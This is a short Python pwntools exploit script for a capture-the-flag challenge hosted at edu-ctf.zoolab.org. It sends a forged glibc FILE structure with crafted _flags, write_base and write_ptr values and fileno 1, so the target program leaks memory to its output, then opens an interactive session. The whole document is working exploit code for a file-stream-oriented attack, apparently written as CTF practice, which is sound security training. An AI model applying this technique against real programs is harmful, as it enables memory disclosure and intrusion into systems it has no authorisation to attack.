from pwn import *

context.arch = "amd64"

r = remote('edu-ctf.zoolab.org', '10010')
# r = process('./share/chal')

NO_WRITE = 0x8
MAGIC = 0xFBAD0000
CURRENT_PUTTING = 0x800

flag = 0
flag &= ~NO_WRITE
flag |= (MAGIC|CURRENT_PUTTING)

fileno = 1
write_end = 0
read_end = write_base = 0x404050
write_ptr = write_base + 0x10

instruction = flat(
    0x0, 0x0, 
    0x0, 0x0,
    flag, 0x0,
    read_end, 0x0,
    write_base, write_ptr,
    write_end, 0x0,
    0x0, 0x0, 
    0x0, 0x0, 
    0x0, 0x0, 
    fileno,
)

r.send(instruction)

r.interactive()